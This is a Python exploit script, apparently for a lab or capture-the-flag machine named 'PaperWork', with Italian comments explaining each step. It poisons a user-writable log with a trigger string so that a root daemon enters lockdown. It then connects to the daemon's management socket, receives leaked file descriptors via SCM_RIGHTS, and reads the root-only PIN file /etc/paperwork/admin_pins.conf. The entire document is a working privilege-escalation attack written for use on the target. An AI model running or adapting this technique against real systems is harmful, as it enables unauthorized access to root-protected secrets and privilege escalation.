#!/usr/bin/env python3
# PaperWork - privesc archivist -> root
# Sfrutta il leak di file descriptor via SCM_RIGHTS in /usr/bin/paperwork-daemon.
# Il daemon (root) tiene aperto un fd su /etc/paperwork/admin_pins.conf (root-only)
# e, quando rileva "malice" nel log che controlliamo, ce lo passa sulla UNIX socket.
# Da archivist: forziamo il ramo lockdown e leggiamo il file root-only via l'fd ricevuto.
#
# Uso (sul target, come archivist):
#   python3 sock_pwn.py

import socket, os, array

SOCK = "/run/paperwork/mgmt.sock"
LOG  = "/home/archivist/printer/logs/commands.log"
TRIGGER = "FSUPLOAD"  # una delle stringhe che scan_for_malice() cerca

def main():
    # (a) avvelena il log per far scattare scan_for_malice() -> trigger_lockdown()
    with open(LOG, "a") as f:
        f.write(TRIGGER + "\n")

    # (b) connettiti alla socket di management (gid archivist puo' scrivere -> connect)
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(SOCK)

    # (c) ricevi il messaggio + gli fd passati via SCM_RIGHTS
    fds = array.array("i")
    maxfds = 10
    msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(maxfds * fds.itemsize))
    print("[+] messaggio dal daemon:", msg)

    for level, typ, data in ancdata:
        if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
            n = len(data) - (len(data) % fds.itemsize)
            fds.frombytes(data[:n])

    if not fds:
        print("[-] nessun fd ricevuto: il log conteneva davvero il trigger? "
              "(trigger_lockdown potrebbe aver truncato il log in un giro precedente)")
        return

    print("[+] fd ricevuti:", list(fds))
    for fd in fds:
        try:
            # gli fd sono aperti O_RDONLY da root: leggiamoli
            content = os.pread(fd, 4096, 0)
            print(f"\n===== contenuto fd {fd} =====")
            try:
                print(content.decode(errors="replace"))
            except Exception:
                print(repr(content))
        except Exception as e:
            print(f"[fd {fd}] errore lettura: {e}")
        finally:
            try: os.close(fd)
            except Exception: pass

    s.close()

if __name__ == "__main__":
    main()
